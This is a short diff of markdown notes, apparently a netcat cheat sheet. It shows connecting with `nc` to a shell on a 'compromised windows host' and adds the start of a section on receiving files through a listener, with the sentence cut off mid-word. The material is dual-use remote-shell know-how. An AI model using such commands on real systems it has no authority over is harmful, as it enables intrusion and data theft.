@@ -44,8 +44,11 @@ on the compromised windows host:
 on the local host:
 `# nc [remote host] 80`
 `ls`
+
+### Creating a backup on a remote machine
+First you must setup a listener on the host that will receive the files. Af
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTE4ODM5NTUyMjIsLTIwMzM4MjkyMywtMz
-E3NDAxNDgxLDU3ODU5Mzg0MiwxMTk5MjUzOTcwLDk0NjAyMjMy
-MywxMzcyOTg2MjAwXX0=
+eyJoaXN0b3J5IjpbMTQ1NjA0MTYxNSwtMjAzMzgyOTIzLC0zMT
+c0MDE0ODEsNTc4NTkzODQyLDExOTkyNTM5NzAsOTQ2MDIyMzIz
+LDEzNzI5ODYyMDBdfQ==
 -->
